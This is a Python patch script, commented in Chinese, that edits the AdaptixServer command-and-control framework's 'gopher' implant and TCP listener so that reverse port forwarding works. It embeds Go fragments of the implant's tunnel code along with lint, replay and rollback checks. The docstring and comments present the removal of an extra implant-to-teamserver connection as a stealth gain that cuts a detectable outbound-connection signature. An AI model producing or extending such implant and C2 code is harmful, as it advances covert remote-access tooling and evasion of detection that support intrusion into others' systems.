#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
批次9b：rportfwd 反向路径 —— 把 ACCEPT 折进 TUNNEL_PACK（方案 A）

── 为什么要有这一批（批次9 的根因，已用 strace 定死） ────────────────────────
  pushTunnelAccept 把 `utils.Message{Type:2, Object:[...]}` 当成**新连接的首包**发，
  且用 `utils.SKey` 加密。而 listener 要求首包必须是 `StartMsg{id,data}`
  且用 `t.Config.EncryptKey`（≡ agent 的 encKey）解密
  （pl_transport.go:394-412）⇒ initMsg.Type 解出 0 ⇒ 六个 case 全不命中 ⇒ goto ERR
  ⇒ TsTunnelConnectionAccept 从未被调用 ⇒ 通道从未注册
  ⇒ agent 随后那条 TUNNEL_PACK 被 `TsTunnelChannelExists` 门拒 ⇒ 靶机从未被拨号。
  实测指纹：数据面只回 4 字节，且是 AES-CTR 把「ERR 处的空帧」解密成的随机 4 字节。

── 本批做法（方案 A）：不修那条通告连接，而是**取消它** ──────────────────────
  把 TunnelId 直接随 TUNNEL_PACK 带到 listener；listener 见「通道不存在 **且**
  TunnelId != 0」时现场调 Ts.TsTunnelConnectionAccept 建通道，随后**复检**再放行。

── 为什么这条路的四个前提都成立（本批逐行读 core 得到，不是推断） ────────────
  ① core 注入给插件的具体类型**就是** *Teamserver
     （TsTunnelChannelExists 在整个 core 里只有 `func (ts *Teamserver)` 一个实现者），
     而 *Teamserver **已经有** TsTunnelConnectionAccept（ts_tunnels.go:719）
     ⇒ listener 插件接口加这一行**不会**运行时断言 panic。
     （硬约束：若具体类型换成包装类型，`ts.(Ts)` 会 panic 打死 teamserver。）
  ② *Teamserver 是**同步**执行 handlerReverseAccept 的
     （net.Dial + RegisterChannel 都在函数体内，只有数据搬运才 go func）
     ⇒ 「调用完立刻复检 TsTunnelChannelExists」是可判定的；目标不可达时 core 会
       tunnel.Callbacks.Close(channelId) 关掉通道 ⇒ 复检不过 ⇒ **fail-closed**。
  ③ NewSafeTunnelChannel 建的是**两对独立管道**（prSrv/pwSrv 服务端侧、
     prTun/pwTun 隧道侧），而 GetChannelPipesByIdOnly 返回 **(prSrv, pwTun)**
     ⇒ core 的 relaySocketToTunnel（srv 侧）与 listener 的 TUNNEL_PACK 中继
       （tun 侧）是**上下游**关系而非竞争关系，**不会双重搬运**。
  ④ agent 主连接是**严格一问一答**（INIT_PACK 分支：有任务才 sendMsg→recvMsg 阻塞等回复），
     没有「agent 主动推送」的载体；三条上行通道（EXFIL/JOB/BOF）都有
     TsTaskRunningExists 门 ⇒ 与其新造协议常量，不如复用**已经验过的** TUNNEL_PACK。

── 净效果 ───────────────────────────────────────────────────────────────────
  · 少一条到 teamserver 的连接（**隐匿性净收益**：反向转发不再产生额外的
    「agent 主动外连」特征）
  · 少一个协议常量（不新增 StartMsg.Type），**core 0 改动**
  · 门是 fail-closed（TunnelId==0 维持原样 ERR；建完复检不过照样 ERR）
  · 正向路径**逐字节等价**（正向 TunnelId 恒为 0，走原分支）

── 编辑形式（本批的硬约束） ─────────────────────────────────────────────────
  8 处 ins **纯插入**：old ⊆ new，一个字节都不删。
  ★ 那道门的改法是关键 —— 只插入新块，**原文件紧跟的 `goto ERR` / `}` 自然成为
    复检体**，所以整处编辑零删除（这是批次9 lint 规则的原意，本批沿用）。
  2 处 del 纯删（废弃的 pushTunnelAccept 调用点与函数体）：lint 改为断言
    「首尾行特征 + 删除锚点在场」，并由 W8 的**逐字节可重放**兜底。

模式：status | check | apply | revert | verify
      REVERT 段与 APPLY 段写在一起（**本仓库没有 git**，补丁脚本 + .bak 是唯一回滚手段）
"""
import hashlib
import io
import os
import re
import shutil
import subprocess
import sys

LST = "/root/cc/AdaptixServer/extenders/gopher_listener_tcp"
AGT = "/root/cc/AdaptixServer/extenders/gopher_agent"
CORE_TUN = "/root/cc/AdaptixServer/core/server/ts_tunnels.go"
UPSTREAM = "/root/cc/AdaptixServer/extenders/beacon_agent/pl_main.go"
BAKDIR = "/root/gp5probe/bak"
SUF = ".bak-rpf2"

F_TRANSPORT = LST + "/pl_transport.go"
F_LMAIN = LST + "/pl_main.go"
F_UTILS = AGT + "/src_gopher/utils/utils.go"
F_TASKS = AGT + "/src_gopher/tasks.go"
FILES = [F_TRANSPORT, F_LMAIN, F_UTILS, F_TASKS]

# ── 公共片段（listener 与 agent 两侧的 TunnelPack 逐字节相同 ⇒ 用同一个锚） ──
# E1 / E4：TunnelPack 加字段（纯插入在 ChannelId 行之后）
# ★ 锚必须带上 Type 行 —— 单凭 `ChannelId int ... channel_id` 在 utils.go 里会命中
#   TunnelPack 与 ParamsTunnelStart 两处（本批踩到，lint 报「出现 2 次」）。
TP_OLD = ('\tType      uint   `msgpack:"type"`\n'
          '\tChannelId int    `msgpack:"channel_id"`\n')
TP_NEW = ('\tType      uint   `msgpack:"type"`\n'
          '\tChannelId int    `msgpack:"channel_id"`\n'
          '\tTunnelId  int    `msgpack:"tunnel_id"`\n')

# E2：门（★ 整块替换 sub 类 —— 复检体必须**改缩进**，做不到"零删除"）
#   为什么不能用纯插入：原文件的 `goto ERR` / `}` 是 3 tab / 2 tab，成为复检体后
#   必须变成 4 tab / 3 tab。本批第一次写成纯插入，结果复检体缩进少一级
#   （gofmt 会改写它）—— 而当时 gofmt 不在 PATH，W7 拿两个空输出比出了假绿。
GATE_OLD = ('\t\tif !Ts.TsTunnelChannelExists(tunPack.ChannelId) {\n'
            '\t\t\tgoto ERR\n'
            '\t\t}\n')
GATE_NEW = (
    '\t\tif !Ts.TsTunnelChannelExists(tunPack.ChannelId) {\n'
    '\t\t\t// ★ 批次9b：反向 rportfwd 的通道由 **agent 自己** accept（channelId 也由\n'
    '\t\t\t//   agent 分配），teamserver 事先不可能知道 ⇒ 正向那条「先注册后使用」\n'
    '\t\t\t//   的时序在反向不成立。这里把「登记」折进 TUNNEL_PACK 自身。\n'
    '\t\t\t//   ★ fail-closed：TunnelId == 0（正向包）维持原样直接 goto ERR；\n'
    '\t\t\t//     建完**复检**，不过照样 goto ERR（目标不可达时 core 会 Close 掉通道）。\n'
    '\t\t\tif tunPack.TunnelId == 0 {\n'
    '\t\t\t\tgoto ERR\n'
    '\t\t\t}\n'
    '\t\t\tTs.TsTunnelConnectionAccept(tunPack.TunnelId, tunPack.ChannelId)\n'
    '\t\t\tif !Ts.TsTunnelChannelExists(tunPack.ChannelId) {\n'
    '\t\t\t\tgoto ERR\n'
    '\t\t\t}\n'
    '\t\t}\n'
)

# E3：listener 插件 Ts 接口加一行
IFACE_OLD = '\tTsTunnelChannelExists(channelId int) bool\n'
IFACE_NEW = ('\tTsTunnelChannelExists(channelId int) bool\n'
             '\tTsTunnelConnectionAccept(tunnelId int, channelId int)\n')

# E5：ParamsTunnelStart 加字段（★ 同样要带 Proto 行才能与 TunnelPack 区分开）
PTS_OLD = ('\tProto     string `msgpack:"proto"`\n'
           '\tChannelId int    `msgpack:"channel_id"`\n')
PTS_NEW = ('\tProto     string `msgpack:"proto"`\n'
           '\tChannelId int    `msgpack:"channel_id"`\n'
           '\tTunnelId  int    `msgpack:"tunnel_id"`\n')

# E6：TUNNEL_PACK 字面量带上 TunnelId
# ★ 必须写成「前缀式后插」（old 是 new 的前缀）—— 把 TunnelId 插在中间会让
#   old 不再是 new 的连续子串，lint 的 old ⊆ new 立刻报红（本批踩到）。
LIT_OLD = 'Type: profile.Type, ChannelId: params.ChannelId'
LIT_NEW = 'Type: profile.Type, ChannelId: params.ChannelId, TunnelId: params.TunnelId'

# E7：tunnelReverseConn 的说明注释（纯插入在既有那行注释之前）
CMT_OLD = '\t// 把连接交给 jobTunnel 的管道（复用，不重写）\n'
CMT_NEW = (
    '\t// ★ 批次9b：不再另开连接向 teamserver 通告 ACCEPT。\n'
    '\t//   本 agent 的主连接是**严格一问一答**的，没有「agent 主动推送」的载体；\n'
    '\t//   而三条上行通道（EXFIL/JOB/BOF）都有 TsTaskRunningExists 门。\n'
    '\t//   改为把 TunnelId 随 TUNNEL_PACK 带上 —— listener 见「通道不存在且\n'
    '\t//   TunnelId != 0」时现场建通道（TsTunnelConnectionAccept）再复检放行。\n'
    '\t//   净效果：少一条到 teamserver 的连接、少一个协议常量、且 fail-closed。\n'
    '\t// 把连接交给 jobTunnel 的管道（复用，不重写）\n'
)

# E8：ParamsTunnelStart 字面量带上 TunnelId（同样前缀式后插）
PST_OLD = '{Proto: "tcp", ChannelId: channelId'
PST_NEW = '{Proto: "tcp", ChannelId: channelId, TunnelId: tunnelId'

# E9：删 pushTunnelAccept 的**调用点**（纯删）
CALL_OLD = ('\tif !pushTunnelAccept(tunnelId, channelId) {\n'
            '\t\t_ = clientConn.Close()\n'
            '\t\treturn\n'
            '\t}\n'
            '\n')
# E10：删 pushTunnelAccept 的**函数体**（纯删）
FUNC_OLD = (
    '// pushTunnelAccept 异步告知 teamserver「有新通道」。走 Type-2（Job）通路，\n'
    '// 与 jobRun 的输出推送同一套写法（DialProfile + Banner + EncryptData(SKey) + SendMsg）。\n'
    '// 返回是否送达 —— 送不出去就不要开 TUNNEL_PACK，否则 teamserver 侧必然拒收。\n'
    'func pushTunnelAccept(tunnelId int, channelId int) bool {\n'
    '\tconn, err := DialProfile(profile, profile.Addresses[0])\n'
    '\tif err != nil {\n'
    '\t\treturn false\n'
    '\t}\n'
    '\tdefer conn.Close()\n'
    '\n'
    '\tbody, _ := msgpack.Marshal(utils.ParamsTunnelAccept{TunnelId: tunnelId, ChannelId: channelId})\n'
    '\tjob := utils.Job{\n'
    '\t\tCommandId: utils.COMMAND_TUNNEL_ACCEPT,\n'
    '\t\tJobId:     fmt.Sprintf("%08x", channelId),\n'
    '\t\tData:      body,\n'
    '\t}\n'
    '\tpackedJob, _ := msgpack.Marshal(job)\n'
    '\tmessage := utils.Message{Type: 2, Object: [][]byte{packedJob}}\n'
    '\tsendData, _ := msgpack.Marshal(message)\n'
    '\tsendData, _ = utils.EncryptData(sendData, utils.SKey)\n'
    '\n'
    '\tif profile.BannerSize > 0 {\n'
    '\t\tif _, err := functions.ConnRead(conn, profile.BannerSize); err != nil {\n'
    '\t\t\treturn false\n'
    '\t\t}\n'
    '\t}\n'
    '\treturn functions.SendMsg(conn, sendData) == nil\n'
    '}\n'
    '\n'
)

# (tag, 文件, old, new, kind, 删除锚点)  kind: ins 纯插入 / del 纯删
# ★ del 的 revert 靠「删除锚点」定位插回位置（该锚点在 apply 后仍在场，由 W6 断言）
EDITS = [
    ("E1", F_TRANSPORT, TP_OLD, TP_NEW, "ins", None),
    ("E2", F_TRANSPORT, GATE_OLD, GATE_NEW, "sub", None),
    ("E3", F_LMAIN, IFACE_OLD, IFACE_NEW, "ins", None),
    ("E4", F_UTILS, TP_OLD, TP_NEW, "ins", None),
    ("E5", F_UTILS, PTS_OLD, PTS_NEW, "ins", None),
    ("E6", F_TASKS, LIT_OLD, LIT_NEW, "ins", None),
    # ★★ E9 必须排在 E7 **之前**（本批踩到，tasks.go revert 后 md5 与 pre-image 不符）：
    #   revert 是**逆序**执行的 ⇒ 排在后面的先撤。E9 的 revert 靠锚点 CMT_OLD 插回，
    #   而 E7 的 new 恰好在 CMT_OLD **之前**插了一整块注释。若 E9 先撤，CALL_OLD 会被
    #   插到「E7 注释」与 CMT_OLD 之间 ⇒ E7 随后找 new 找不到（报 "new 计数 0"）⇒
    #   还原出错位。把 E9 放前面 ⇒ 逆序时 E7 先撤掉注释，E9 再插回，位置正确。
    #   apply 方向 E9→E7 无冲突：E9 删的是 CMT_OLD **上面**那 5 行，E7 插在它**前面**。
    ("E9", F_TASKS, CALL_OLD, "", "del", CMT_OLD),
    ("E7", F_TASKS, CMT_OLD, CMT_NEW, "ins", None),
    ("E8", F_TASKS, PST_OLD, PST_NEW, "ins", None),
    ("E10", F_TASKS, FUNC_OLD, "", "del", 'func jobTunnel(paramsData []byte) {\n'),
]


# ── 基础 ─────────────────────────────────────────────────────────────────────
def read(p):
    return io.open(p, encoding="utf-8").read()


def write(p, s):
    io.open(p, "w", encoding="utf-8", newline="\n").write(s)


def md5(p):
    return hashlib.md5(io.open(p, "rb").read()).hexdigest()[:8]


def bakname(p):
    return BAKDIR + "/" + os.path.basename(p) + SUF


def sh(cmd):
    r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT)
    return r.returncode, r.stdout.decode("utf-8", "replace")


# ── status ───────────────────────────────────────────────────────────────────
def scan():
    """★ 判据必须按「new 是否在场」来判，**不能**按「old 是否还在」判：
       ins/sub 类的 new 里**包含** old（纯插入 / 整块改写都保留原文行）⇒ apply 之后
       old 仍在场。本批第一次写成「old 走没走」⇒ apply 完 10 处报 8 处 ???
       （而 W8 的逐字节重放同时全绿，正好指出文件是对的、判据是错的）。
       ★ 这也是「判据必须量被测对象真正改变了什么」的一个实例。"""
    st = {}
    for tag, f, old, new, kind, anc in EDITS:
        s = read(f)
        co, cn = s.count(old), s.count(new)
        if kind == "del":
            st[tag] = "done" if co == 0 else ("todo" if co == 1 else "???")
        else:
            if cn == 1:
                st[tag] = "done"
            elif cn == 0 and co == 1:
                st[tag] = "todo"
            else:
                st[tag] = "???"
    return st


def cmd_status():
    st = scan()
    for tag, f, old, new, kind, anc in EDITS:
        print("  [%-4s] %-4s %-6s %-16s %s"
              % (st[tag], tag, kind, os.path.basename(f), old.split("\n")[0][:60]))
    n = sum(1 for v in st.values() if v == "done")
    print("  ---- %d/%d done" % (n, len(EDITS)))
    return 0 if n == len(EDITS) else 1


# ── lint ─────────────────────────────────────────────────────────────────────
def lint(verbose=True, use_bak=False):
    """ins：old 恰好 1 次 + old ⊆ new + old != new（纯插入，一个字节都不删）
       sub：old 恰好 1 次 + old != new（整块改写；改对了哪些行由 W8 逐字节重放兜底）
       del：old 恰好 1 次 + 首尾行特征 + 删除锚点在 old 之外且唯一（revert 定位）
       ★ use_bak=True 时改读**回滚点**：apply 之后 sub/del 类的 old 已不在当前文件里
         （这是正常的，不是错），所以 verify 阶段的 lint 复检必须跑在 pre-image 上 ——
         它证的命题是「回滚点 + APPLY 段自洽 ⇒ revert 之后还能再 apply」。"""
    bad = []
    for tag, f, old, new, kind, anc in EDITS:
        s = read(bakname(f) if use_bak else f)
        c = s.count(old)
        if c != 1:
            bad.append("%s old 出现 %d 次（须恰好 1）" % (tag, c))
            continue
        if kind == "ins":
            if old not in new:
                bad.append("%s 违反 old ⊆ new（纯插入必须包含原文）" % tag)
            if old == new:
                bad.append("%s old == new（空编辑）" % tag)
            if not new.startswith(old) and not new.endswith(old):
                bad.append("%s new 不是「old 前插/后插」形式（插在中间易误伤）" % tag)
        elif kind == "sub":
            if old == new:
                bad.append("%s old == new（空编辑）" % tag)
            if new.count("\n") < old.count("\n"):
                bad.append("%s 改写后行数反而变少（疑似误删）" % tag)
        else:
            if not (old.endswith("}\n") or old.endswith("}\n\n")):
                bad.append("%s 纯删块未以 '}\\n' 收尾 ⇒ 可能删不干净" % tag)
            if anc is None:
                bad.append("%s 缺删除锚点（revert 无法定位）" % tag)
            elif anc in old:
                bad.append("%s 删除锚点落在 old 之内（revert 会重复插入）" % tag)
            elif s.count(anc) != 1:
                bad.append("%s 删除锚点在原文中出现 %d 次（须恰好 1）" % (tag, s.count(anc)))
    if verbose:
        if bad:
            print("  LINT: FAIL")
            for b in bad:
                print("    · " + b)
        else:
            print("  LINT: OK（%d 处：%d 纯插入 + %d 整块改写 + %d 纯删；old 全唯一）"
                  % (len(EDITS),
                     sum(1 for e in EDITS if e[4] == "ins"),
                     sum(1 for e in EDITS if e[4] == "sub"),
                     sum(1 for e in EDITS if e[4] == "del")))
    return 1 if bad else 0


def cmd_check():
    print("== 批次9b check ==")
    rc = lint()
    rc |= cmd_status()
    core = read(CORE_TUN)
    n_acc = len(re.findall(r"func \([^)]*\) TsTunnelConnectionAccept\(", core))
    _, out = sh("grep -rn 'TsTunnelChannelExists' %s/core/server/*.go" % os.path.dirname(os.path.dirname(LST)))
    n_ex = sum(1 for ln in out.strip().split("\n") if "func (" in ln)
    print("  [前提1] core 中 TsTunnelConnectionAccept 实现者数 = %d（须 1）" % n_acc)
    print("  [前提2] core 中 TsTunnelChannelExists 实现者数 = %d（须 1，且是 *Teamserver）" % n_ex)
    print("  [前提3] core handlerReverseAccept 同步注册：%s"
          % ("是" if re.search(
              r"func handlerReverseAccept\([^)]*\) \{\n(?:.*\n)*?\ttm\.RegisterChannel\(",
              core) else "**否 —— 方案 A 的复检不可判定**"))
    if n_acc != 1 or n_ex != 1:
        print("  *** 前提不成立：插件 Ts 的具体类型可能已换 ⇒ 加接口行会 panic")
        rc = 1
    return rc


# ── apply / revert ───────────────────────────────────────────────────────────
def cmd_apply():
    st = scan()
    if any(v == "???" for v in st.values()):
        print("APPLY 中止：存在 ??? 锚点，先查 status")
        return 1
    if all(v == "done" for v in st.values()):
        print("APPLY 跳过：%d/%d 已是 done（幂等）" % (len(EDITS), len(EDITS)))
        return 0
    if lint(verbose=False):
        print("APPLY 中止：lint 不过")
        return 1
    if not os.path.isdir(BAKDIR):
        os.makedirs(BAKDIR)
    for f in FILES:
        b = bakname(f)
        if os.path.exists(b):
            print("  bak 已存在，保留：%-16s md5 %s" % (os.path.basename(b), md5(b)))
            continue
        shutil.copy2(f, b)
        print("  bak 新建：      %-16s md5 %s" % (os.path.basename(b), md5(b)))
    n = 0
    for tag, f, old, new, kind, anc in EDITS:
        s = read(f)
        if s.count(old) != 1:
            print("APPLY 中止于 %s：old 计数 %d" % (tag, s.count(old)))
            return 1
        write(f, s.replace(old, new, 1))
        n += 1
        print("  [done] %-4s %-6s %s" % (tag, kind, os.path.basename(f)))
    print("APPLY 完成：%d 处" % n)
    return 0


def cmd_revert():
    n = 0
    for tag, f, old, new, kind, anc in reversed(EDITS):
        s = read(f)
        if kind == "del":
            if s.count(old) > 0:
                print("  [skip] %-4s %s：old 仍在场" % (tag, os.path.basename(f)))
                continue
            if s.count(anc) != 1:
                print("REVERT 中止 %s：删除锚点计数 %d" % (tag, s.count(anc)))
                return 1
            write(f, s.replace(anc, old + anc, 1))
            n += 1
            print("  [rev ] %-4s del    %s（按锚点插回）" % (tag, os.path.basename(f)))
            continue
        if s.count(new) != 1:
            print("  [skip] %-4s %s：new 计数 %d" % (tag, os.path.basename(f), s.count(new)))
            continue
        write(f, s.replace(new, old, 1))
        n += 1
        print("  [rev ] %-4s ins    %s" % (tag, os.path.basename(f)))
    print("REVERT 完成：%d 处" % n)
    return 0


# ── verify ───────────────────────────────────────────────────────────────────
class R(object):
    def __init__(self):
        self.rows = []
        self.ok = True

    def ck(self, cond, tag, desc):
        self.rows.append((bool(cond), tag, desc))
        if not cond:
            self.ok = False


def _block(s, name):
    k = s.index("type %s struct" % name)
    return s[k:s.index("\n}", k) + 2]


def _tag_of(block, field):
    for ln in block.split("\n"):
        t = ln.strip()
        if t.startswith(field + " ") or t.startswith(field + "\t"):
            m = re.search(r'`([^`]*)`', ln)
            return m.group(1) if m else None
    return None


def _replay(ws, rel):
    """把 pre-image 按 APPLY 段正向重放一遍，返回 (结果, 错误列表)"""
    rep = ws
    bad = []
    for tag, o, n, k, anc in rel:
        if rep.count(o) != 1:
            bad.append("%s old 在 pre-image 中出现 %d 次" % (tag, rep.count(o)))
            continue
        rep = rep.replace(o, n, 1)
    return rep, bad


def cmd_verify():
    R_ = R()
    tr, lm = read(F_TRANSPORT), read(F_LMAIN)
    ut, tk = read(F_UTILS), read(F_TASKS)
    core, ups = read(CORE_TUN), read(UPSTREAM)

    # W1 锚点
    st = scan()
    R_.ck(all(v == "done" for v in st.values()), "W1", "%d/%d 锚点 done：%s"
          % (sum(1 for v in st.values() if v == "done"), len(EDITS),
             ",".join("%s=%s" % (k, v) for k, v in st.items())))

    # W2 lint 复检 —— ★ 跑在**回滚点**上（apply 后 sub/del 的 old 已不在当前文件里）
    R_.ck(lint(verbose=False, use_bak=True) == 0, "W2",
          "pre-image 满足 lint（回滚点 + APPLY 段自洽 ⇒ revert 之后还能再 apply）")
    # W2b 当前文件侧：只能对 ins 类复检（old 应仍在场且新增块在场）
    ins_bad = []
    for tag, f, old, new, kind, anc in EDITS:
        if kind != "ins":
            continue
        s = read(f)
        if s.count(new) != 1 or s.count(old) < 1:
            ins_bad.append("%s new=%d old=%d" % (tag, s.count(new), s.count(old)))
    R_.ck(not ins_bad, "W2b", "当前文件 7 处纯插入：新增块各 1 份、原文仍在（%s）"
          % ("; ".join(ins_bad) if ins_bad else "OK"))

    # W3 ★跨端协议同构：两侧 TunnelPack.TunnelId 的 msgpack tag 必须逐字节相同
    lt = _tag_of(_block(tr, "TunnelPack"), "TunnelId")
    at = _tag_of(_block(ut, "TunnelPack"), "TunnelId")
    st2 = _tag_of(_block(ut, "ParamsTunnelStart"), "TunnelId")
    R_.ck(lt == at == st2 == 'msgpack:"tunnel_id"',
          "W3", "跨端 tag 同构 listener=%r agent.TunnelPack=%r agent.ParamsTunnelStart=%r"
          % (lt, at, st2))
    # ★ 判据必须**定位到那一行**再断言，不能全文件数出现次数：
    #   `TunnelId: params.TunnelId` 在 tasks.go 里本来就有 2 处（taskTunnelReverse 用
    #   ParamsTunnelReverse.TunnelId）⇒ 全文件计数是 3，写死 ==1 会报假红（本批踩到）。
    lit = [l for l in tk.split("\n") if "utils.TunnelPack{Id: uint(AgentId)" in l]
    R_.ck(len(lit) == 1 and "TunnelId: params.TunnelId" in lit[0], "W3b",
          "TUNNEL_PACK 字面量那一行确实带上了 TunnelId（定位后断言，不看全局计数）")
    pst = [l for l in tk.split("\n") if "utils.ParamsTunnelStart{Proto:" in l]
    R_.ck(len(pst) == 1 and "TunnelId: tunnelId" in pst[0], "W3c",
          "ParamsTunnelStart 字面量那一行确实带上了 TunnelId")

    # W4 ★fail-closed + 顺序：TunnelId==0 分支必须**先于** accept，accept 必须先于复检
    i_zero = tr.find("if tunPack.TunnelId == 0 {")
    i_acc = tr.find("Ts.TsTunnelConnectionAccept(tunPack.TunnelId, tunPack.ChannelId)")
    i_re = tr.find("TsTunnelChannelExists(tunPack.ChannelId)", i_acc)
    R_.ck(0 < i_zero < i_acc < i_re, "W4",
          "顺序断言 TunnelId==0(%d) < accept(%d) < 复检(%d)" % (i_zero, i_acc, i_re))
    R_.ck(tr.count("Ts.TsTunnelConnectionAccept(tunPack.TunnelId, tunPack.ChannelId)") == 1,
          "W4b", "accept 调用点恰好 1 处")
    R_.ck(tr.count("if tunPack.TunnelId == 0 {") == 1, "W4c",
          "fail-closed 前置分支恰好 1 处")
    ln_acc = [l for l in tr.split("\n") if "TsTunnelConnectionAccept(tunPack.TunnelId" in l][0]
    ln_gate = [l for l in tr.split("\n")
               if l.strip().startswith("if !Ts.TsTunnelChannelExists(tunPack.ChannelId)")][0]
    R_.ck(ln_acc.startswith("\t\t\t") and ln_gate.startswith("\t\t"),
          "W4d", "accept 在门**体内**（缩进 %d > 门 %d）"
          % (len(ln_acc) - len(ln_acc.lstrip("\t")),
             len(ln_gate) - len(ln_gate.lstrip("\t"))))

    # W5 ★正向路径逐字节等价：正向 TunnelId 恒为 0 ⇒ 原样 goto ERR，绝不触碰新块
    R_.ck("\t\t\tif tunPack.TunnelId == 0 {\n\t\t\t\tgoto ERR\n\t\t\t}\n" in tr, "W5",
          "正向包（TunnelId==0）维持原样 goto ERR")
    # 复检体必须是**缩进正确**的 goto ERR / }（本批第一次写成纯插入，复检体的
    # goto ERR 停在 3 tab、} 停在 2 tab ⇒ gofmt 会改写 ⇒ 是**真红**）
    R_.ck(tr.count("\t\t\tif !Ts.TsTunnelChannelExists(tunPack.ChannelId) {\n"
                   "\t\t\t\tgoto ERR\n"
                   "\t\t\t}\n") == 1,
          "W5b", "复检体的 goto ERR / } 缩进正确（4 tab / 3 tab）")
    # 门块整体形状：外层 if(2tab) … 内层 fail-closed + accept + 复检 … 收尾 }(2tab)
    R_.ck(tr.count("\t\t\tif tunPack.TunnelId == 0 {\n"
                   "\t\t\t\tgoto ERR\n"
                   "\t\t\t}\n"
                   "\t\t\tTs.TsTunnelConnectionAccept(tunPack.TunnelId, tunPack.ChannelId)\n"
                   "\t\t\tif !Ts.TsTunnelChannelExists(tunPack.ChannelId) {\n"
                   "\t\t\t\tgoto ERR\n"
                   "\t\t\t}\n"
                   "\t\t}\n") == 1,
          "W5c", "门块逐字节形状正确（fail-closed → accept → 复检 → 收口）")

    # W6 ★隐匿性 + 删除彻底 + 锚点仍在
    R_.ck("pushTunnelAccept" not in tk, "W6",
          "pushTunnelAccept 已彻底消失（那条多余的 teamserver 连接不再存在）")
    n_util = tk.count("utils.")
    R_.ck(n_util > 100, "W6b",
          "删除未波及 import：tasks.go 仍有 %d 处 utils.* 引用（阈值 100）" % n_util)
    for tag, f, old, new, kind, anc in EDITS:
        if kind == "del":
            R_.ck(read(f).count(anc) == 1, "W6c",
                  "%s 删除锚点在位（revert 可定位）：%s" % (tag, anc.strip()[:40]))
    R_.ck("ParamsTunnelAccept" in ut, "W6d",
          "utils.ParamsTunnelAccept 保留（死代码但不删，缩小补丁面）")

    # W7 gofmt 零新增
    # ★★ gofmt **不在 PATH**（必须用 /usr/local/go/bin/gofmt）。
    #   本批第一次直接写 `gofmt -d` ⇒ shell 报 "gofmt: not found" ⇒ 前后都是**空输出**
    #   ⇒ 两个字串相等 ⇒ 全项 PASS。**「命令跑不起来」被当成了「检查通过」** ——
    #   这是「空值即通过」家族里最隐蔽的一支：判据在比较两个空值。
    #   所以这里先**断言工具存在**，再比 delta；工具不在就直接红。
    GOFMT = "/usr/local/go/bin/gofmt"
    R_.ck(os.path.exists(GOFMT), "W7", "gofmt 在场（%s）—— 否则本项会拿两个空输出比出假绿"
          % GOFMT)
    for f in FILES:
        b = bakname(f)
        if not os.path.exists(b):
            R_.ck(False, "W7", "缺回滚点 %s" % b)
            continue
        _, a = sh("%s -d %s | wc -l" % (GOFMT, b))
        _, c = sh("%s -d %s | wc -l" % (GOFMT, f))
        ok = a.strip().isdigit() and c.strip().isdigit() and a.strip() == c.strip()
        R_.ck(ok, "W7",
              "gofmt 零新增 %-16s pre=%-5s post=%-5s"
              % (os.path.basename(f), a.strip(), c.strip()))

    # W8 ★回滚点是可正向重放的 pre-image（逐字节）
    for f in FILES:
        b = bakname(f)
        if not os.path.exists(b):
            R_.ck(False, "W8", "缺 %s" % b)
            continue
        rel = [(t, o, n, k, a) for (t, ff, o, n, k, a) in EDITS if ff == f]
        rep, bad = _replay(read(b), rel)
        R_.ck(rep == read(f) and not bad, "W8",
              "pre-image 可正向重放 %-16s md5=%s %s"
              % (os.path.basename(f), md5(b), ("; ".join(bad) if bad else "")))

    # W9 ★接口签名三方逐字节一致（防运行时断言 panic）
    m_core = re.search(r"func \(ts \*Teamserver\) TsTunnelConnectionAccept\(([^)]*)\)", core)
    m_up = re.search(r"^\tTsTunnelConnectionAccept\(([^)]*)\)", ups, re.M)
    m_l = re.search(r"^\tTsTunnelConnectionAccept\(([^)]*)\)", lm, re.M)
    sig_core = m_core.group(1) if m_core else None
    sig_up = m_up.group(1) if m_up else None
    sig_l = m_l.group(1) if m_l else None
    R_.ck(sig_l is not None and sig_l == sig_core == sig_up,
          "W9", "接口签名三方一致 core=%r upstream=%r listener=%r"
          % (sig_core, sig_up, sig_l))
    R_.ck("func (ts *Teamserver) TsTunnelConnectionAccept(" in core, "W9b",
          "core 里实现者确为 *Teamserver ⇒ ts.(Ts) 不会 panic")

    # W10 ★core 零改动（本批的卖点之一）
    _, out = sh("ls -1 %s/core/server/*.bak-rpf2 2>/dev/null | wc -l" % os.path.dirname(os.path.dirname(LST)))
    R_.ck(out.strip() == "0", "W10",
          "core/server 下无 .bak-rpf2 ⇒ core 确实零改动（%s 个）" % out.strip())

    print("== 批次9b verify ==")
    for ok, tag, desc in R_.rows:
        print("  [%s] %-5s %s" % ("PASS" if ok else "FAIL", tag, desc))
    print("RESULT: %s" % ("PASS" if R_.ok else "FAIL"))
    return 0 if R_.ok else 1


MODES = {"status": cmd_status, "check": cmd_check, "apply": cmd_apply,
         "revert": cmd_revert, "verify": cmd_verify}

if __name__ == "__main__":
    m = sys.argv[1] if len(sys.argv) > 1 else "check"
    if m not in MODES:
        print("用法: %s {%s}" % (sys.argv[0], "|".join(MODES)))
        sys.exit(2)
    sys.exit(MODES[m]())
